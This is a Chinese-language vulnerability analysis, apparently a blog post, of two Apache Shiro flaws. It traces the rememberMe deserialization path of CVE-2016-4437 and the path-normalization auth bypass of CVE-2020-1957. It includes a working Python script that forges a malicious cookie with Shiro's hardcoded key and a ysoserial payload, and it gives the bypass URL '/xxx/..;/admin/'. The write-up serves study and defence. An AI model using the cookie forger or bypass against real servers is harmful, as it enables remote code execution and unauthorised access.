# CVE-2016-4437&shiro-550

https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4

## 加密

`src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java`

```java
    public void onSuccessfulLogin(Subject subject, AuthenticationToken token, AuthenticationInfo info) {//登录成功后会调用该方法,主要实现了生成加密的RememberMe Cookie,然后将RememberMe Cookie设置为用户的Cookie值
        //always clear any previous identity:
        forgetIdentity(subject);

        //now save the new identity:
        if (isRememberMe(token)) {//判断用户是否选择了Remember Me选项
            rememberIdentity(subject, token, info);
        } else {
            if (log.isDebugEnabled()) {
                log.debug("AuthenticationToken did not indicate RememberMe is requested.  " +
                        "RememberMe functionality will not be executed for corresponding account.");
            }
        }
    }
    
    public void rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo) {
        PrincipalCollection principals = getIdentityToRemember(subject, authcInfo);//生成一个PrincipalCollection对象，里面包含登录信息
        rememberIdentity(subject, principals);
    }
    
    protected PrincipalCollection getIdentityToRemember(Subject subject, AuthenticationInfo info) {
        return info.getPrincipals();
    }
    
    protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
        byte[] bytes = convertPrincipalsToBytes(accountPrincipals);
        rememberSerializedIdentity(subject, bytes);//跳转protected void rememberSerializedIdentity(Subject subject, byte[] serialized)
    }

    protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        byte[] bytes = serialize(principals);//进行了序列化，然后返回序列化后的Byte数组。
        if (getCipherService() != null) {//是否加密,这里追踪下去就会发现加密密钥为DEFAULT_CIPHER_KEY_BYTES即硬编码的shiro密钥
            bytes = encrypt(bytes);
        }
        return bytes;
    }
```

`src/main/java/org/apache/shiro/io/DefaultSerializer.java`

```java
    public byte[] serialize(T o) throws SerializationException {
        if (o == null) {
            String msg = "argument cannot be null.";
            throw new IllegalArgumentException(msg);
        }
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        BufferedOutputStream bos = new BufferedOutputStream(baos);

        try {
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(o);
            oos.close();
            return baos.toByteArray();
        } catch (IOException e) {
            String msg = "Unable to serialize object [" + o + "].  " +
                    "In order for the DefaultSerializer to serialize this object, the [" + o.getClass().getName() + "] " +
                    "class must implement java.io.Serializable.";
            throw new SerializationException(msg, e);
        }
    }
```

`src/main/java/org/apache/shiro/web/mgt/CookieRememberMeManager.java`

```java
    protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {//为使用Base64对指定的序列化字节数组进行编码，并将Base64编码的字符串设置为cookie值。

        if (!WebUtils.isHttp(subject)) {
            if (log.isDebugEnabled()) {
                String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet " +
                        "request and response in order to set the rememberMe cookie. Returning immediately and " +
                        "ignoring rememberMe operation.";
                log.debug(msg);
            }
            return;
        }


        HttpServletRequest request = WebUtils.getHttpRequest(subject);
        HttpServletResponse response = WebUtils.getHttpResponse(subject);

        //base 64 encode it and store as a cookie:
        String base64 = Base64.encodeToString(serialized);

        Cookie template = getCookie(); //the class attribute is really a template for the outgoing cookies
        Cookie cookie = new SimpleCookie(template);
        cookie.setValue(base64);//设置cookie
        cookie.saveTo(request, response);
    }
```

## 解密

`src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java`

```java
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;
        try {
            byte[] bytes = getRememberedSerializedIdentity(subjectContext);//跳转protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext)
            //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
            if (bytes != null && bytes.length > 0) {
                principals = convertBytesToPrincipals(bytes, subjectContext);//把byte[]转换成PrincipalCollection
            }
        } catch (RuntimeException re) {
            principals = onRememberedPrincipalFailure(re, subjectContext);
        }

        return principals;
    }

    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (getCipherService() != null) {
            bytes = decrypt(bytes);//解密
        }
        return deserialize(bytes);//对解密后的结果进行反序列化
    }

    protected PrincipalCollection deserialize(byte[] serializedIdentity) {
        return getSerializer().deserialize(serializedIdentity);
    }

    protected byte[] decrypt(byte[] encrypted) {
        byte[] serialized = encrypted;
        CipherService cipherService = getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());//这里追踪下去就会发现解密密钥为DEFAULT_CIPHER_KEY_BYTES即硬编码的shiro密钥
            serialized = byteSource.getBytes();
        }
        return serialized;
    }
```

`src/main/java/org/apache/shiro/io/DefaultSerializer.java`

```java
    public T deserialize(byte[] serialized) throws SerializationException {
        if (serialized == null) {
            String msg = "argument cannot be null.";
            throw new IllegalArgumentException(msg);
        }
        ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
        BufferedInputStream bis = new BufferedInputStream(bais);
        try {
            ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
            @SuppressWarnings({"unchecked"})
            T deserialized = (T) ois.readObject();//反序列化
            ois.close();
            return deserialized;
        } catch (Exception e) {
            String msg = "Unable to deserialze argument byte array.";
            throw new SerializationException(msg, e);
        }
    }
```

`src/main/java/org/apache/shiro/web/mgt/CookieRememberMeManager.java`

```java
    protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

        if (!WebUtils.isHttp(subjectContext)) {
            if (log.isDebugEnabled()) {
                String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                        "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                        "immediately and ignoring rememberMe operation.";
                log.debug(msg);
            }
            return null;
        }

        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
        if (isIdentityRemoved(wsc)) {
            return null;
        }

        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
        HttpServletResponse response = WebUtils.getHttpResponse(wsc);

        String base64 = getCookie().readValue(request, response);//读取rememberme的cookie值
        // Browsers do not always remove cookies immediately (SHIRO-183)
        // ignore cookies that are scheduled for removal
        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

        if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64);//base64解密
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
    }
```

>通过获取rememberMe值，然后进行解密后再进行反序列化操作

假设攻击者已经获取到了密钥,那么就可以伪造加密流程,让shiro进行任意反序列化操作

## 利用

```python
from Crypto.Cipher import AES
import base64
import uuid


def AES_encrypt(secret_key, data):
    """
    :param secret_key [byte] : 加密秘钥
    :param data [byte] : 需要加密数据
    :return   [str] :
    """
    BLOCK_SIZE = 16  # Bytes
    # 数据进行 PKCS5Padding 的填充
    # 字节padding

    def pad(s): return s + (BLOCK_SIZE - len(s) %
                            BLOCK_SIZE) * chr(BLOCK_SIZE - len(s) % BLOCK_SIZE).encode()

    raw = pad(data)
    iv = uuid.uuid4().bytes
    cipher = AES.new(secret_key, AES.MODE_CBC, iv=iv)
    # 得到加密后的字节码
    encrypted_text = cipher.encrypt(raw)
    return base64.b64encode(iv+encrypted_text).decode()

if __name__ == '__main__':
    key = 'kPH+bIxk5D2deZiIxcaaaA=='
    ser_path = '/home/debian/SecTools/ysoserial/raw.ser'#java -jar ysoserial-all.jar CommonsBeanutils1 'touch /tmp/asdf' > raw.ser
    try:
        t=''
        with open(ser_path,'rb') as f:
            t = f.read()
        model = AES.MODE_CBC

        key = base64.b64decode(key.encode())
        crypto_text = AES_encrypt(key, t)
        print(crypto_text)
    except Exception as e:
        print(e)
```

![](https://img.mi3aka.eu.org/2022/09/3d7fb4a8955030ac2c3899b5f52505d6.png)

![](https://img.mi3aka.eu.org/2022/09/7efc42bc9b5743a30de6697e6336c422.png)

# CVE-2020-1957

>Apache Shiro 认证绕过漏洞

直接请求管理页面`/admin/`,无法访问将会被重定向到登录页面,构造恶意请求`/xxx/..;/admin/`,即可绕过权限校验,访问到管理页面

![](https://img.mi3aka.eu.org/2022/09/fb97bcf17d1a50d95d4843f0fbe9a02a.png)

## 分析

[CVE-2020-1957 Apache Shiro Servlet未授权访问浅析](https://xz.aliyun.com/t/8281)

>shiro处理

```java
    // org/apache/shiro/shiro-web/1.4.1/shiro-web-1.4.1.jar!/org/apache/shiro/web/filter/mgt/PathMatchingFilterChainResolver.class

    public FilterChain getChain(ServletRequest request, ServletResponse response, FilterChain originalChain) {
        FilterChainManager filterChainManager = getFilterChainManager();
        if (!filterChainManager.hasChains()) {
            return null;
        }

        String requestURI = getPathWithinApplication(request);//解析URL并进行过滤,最终得到/xxx/..

        //the 'chain names' in this implementation are actually path patterns defined by the user.  We just use them
        //as the chain name for the FilterChainManager's requirements
        for (String pathPattern : filterChainManager.getChainNames()) {//在for循环中进行判断权限
            /*
            filterChainManager.getChainNames()得到
            0 = "/login"
            1 = "/xxx/**"
            2 = "/admin"
            3 = "/admin.*"
            4 = "/admin/**"
            5 = "/**"
            */

            // If the path does match, then pass on to the subclass implementation for specific checks:
            if (pathMatches(pathPattern, requestURI)) {//此时/xxx/..与/xxx/**匹配
                if (log.isTraceEnabled()) {
                    log.trace("Matched path pattern [" + pathPattern + "] for requestURI [" + requestURI + "].  " +
                            "Utilizing corresponding filter chain...");
                }
                return filterChainManager.proxy(originalChain, pathPattern);
            }
        }

        return null;
    }

    // org/apache/shiro/shiro-web/1.4.1/shiro-web-1.4.1.jar!/org/apache/shiro/web/util/WebUtils.class

    public static String getPathWithinApplication(HttpServletRequest request) {
        String contextPath = getContextPath(request);
        String requestUri = getRequestUri(request);//解析URL并进行过滤
        if (StringUtils.startsWithIgnoreCase(requestUri, contextPath)) {
            // Normal case: URI contains context path.
            String path = requestUri.substring(contextPath.length());
            return (StringUtils.hasText(path) ? path : "/");
        } else {
            // Special case: rather unusual.
            return requestUri;
        }
    }

    // org/apache/tomcat/embed/tomcat-embed-core/8.5.43/tomcat-embed-core-8.5.43.jar!/org/apache/catalina/connector/RequestFacade.class

    public static String getRequestUri(HttpServletRequest request) {
        String uri = (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);
        if (uri == null) {
            uri = request.getRequestURI();//uri=/xxx/..;/admin
        }
        return normalize(decodeAndCleanUriString(request, uri));//剔除;后的字符,并对URI进行标准化,得到/xxx/..
    }

    // org/apache/shiro/shiro-web/1.4.1/shiro-web-1.4.1.jar!/org/apache/shiro/web/util/WebUtils.class

    private static String decodeAndCleanUriString(HttpServletRequest request, String uri) {
        uri = decodeRequestString(request, uri);
        int semicolonIndex = uri.indexOf(';');
        return (semicolonIndex != -1 ? uri.substring(0, semicolonIndex) : uri);
    }

    // org/apache/shiro/shiro-web/1.4.1/shiro-web-1.4.1.jar!/org/apache/shiro/web/util/WebUtils.class

    private static String normalize(String path, boolean replaceBackSlash) {

        if (path == null)
            return null;

        // Create a place for the normalized path
        String normalized = path;

        if (replaceBackSlash && normalized.indexOf('\\') >= 0)
            normalized = normalized.replace('\\', '/');

        if (normalized.equals("/."))
            return "/";

        // Add a leading "/" if necessary
        if (!normalized.startsWith("/"))
            normalized = "/" + normalized;

        // Resolve occurrences of "//" in the normalized path
        while (true) {
            int index = normalized.indexOf("//");
            if (index < 0)
                break;
            normalized = normalized.substring(0, index) +
                    normalized.substring(index + 1);
        }

        // Resolve occurrences of "/./" in the normalized path
        while (true) {
            int index = normalized.indexOf("/./");
            if (index < 0)
                break;
            normalized = normalized.substring(0, index) +
                    normalized.substring(index + 2);
        }

        // Resolve occurrences of "/../" in the normalized path
        while (true) {
            int index = normalized.indexOf("/../");
            if (index < 0)
                break;
            if (index == 0)
                return (null);  // Trying to go outside our context
            int index2 = normalized.lastIndexOf('/', index - 1);
            normalized = normalized.substring(0, index2) +
                    normalized.substring(index + 3);
        }

        // Return the normalized path that we have completed
        return (normalized);//最终返回的结果为/xxx/..

    }
```

>spring处理

```java
    // org/springframework/spring-web/4.3.25.RELEASE/spring-web-4.3.25.RELEASE.jar!/org/springframework/web/util/UrlPathHelper.class

    public String getPathWithinServletMapping(HttpServletRequest request) {
        String pathWithinApp = this.getPathWithinApplication(request);//pathWithinApp = /xxx/../admin
        String servletPath = this.getServletPath(request);// /admin
        String sanitizedPathWithinApp = this.getSanitizedPath(pathWithinApp);
        String path;
        if (servletPath.contains(sanitizedPathWithinApp)) {
            path = this.getRemainingPath(sanitizedPathWithinApp, servletPath, false);
        } else {
            path = this.getRemainingPath(pathWithinApp, servletPath, false);
        }

        if (path != null) {
            return path;
        } else {
            String pathInfo = request.getPathInfo();
            if (pathInfo != null) {
                return pathInfo;
            } else {
                if (!this.urlDecode) {
                    path = this.getRemainingPath(this.decodeInternal(request, pathWithinApp), servletPath, false);
                    if (path != null) {
                        return pathWithinApp;
                    }
                }

                return servletPath;
            }
        }
    }

    // org/springframework/spring-web/4.3.25.RELEASE/spring-web-4.3.25.RELEASE.jar!/org/springframework/web/util/UrlPathHelper.class

    public String getServletPath(HttpServletRequest request) {
        String servletPath = (String)request.getAttribute("javax.servlet.include.servlet_path");
        if (servletPath == null) {
            servletPath = request.getServletPath();// /admin
        }

        if (servletPath.length() > 1 && servletPath.endsWith("/") && this.shouldRemoveTrailingServletPathSlash(request)) {
            servletPath = servletPath.substring(0, servletPath.length() - 1);
        }

        return servletPath;
    }

    // org/apache/tomcat/embed/tomcat-embed-core/8.5.43/tomcat-embed-core-8.5.43.jar!/org/apache/catalina/connector/RequestFacade.class

    public String getServletPath() {
        if (this.request == null) {
            throw new IllegalStateException(sm.getString("requestFacade.nullRequest"));
        } else {
            return this.request.getServletPath();// /admin
        }
    }

    // org/apache/tomcat/embed/tomcat-embed-core/8.5.43/tomcat-embed-core-8.5.43.jar!/org/apache/catalina/connector/Request.class

    public String getServletPath() {
        return this.mappingData.wrapperPath.toString();// /admin 形成了对/admin这个Servlet的未授权访问
    }
```

![](https://img.mi3aka.eu.org/2022/09/a62c9d0d3b22343e22105dafa586aad9.png)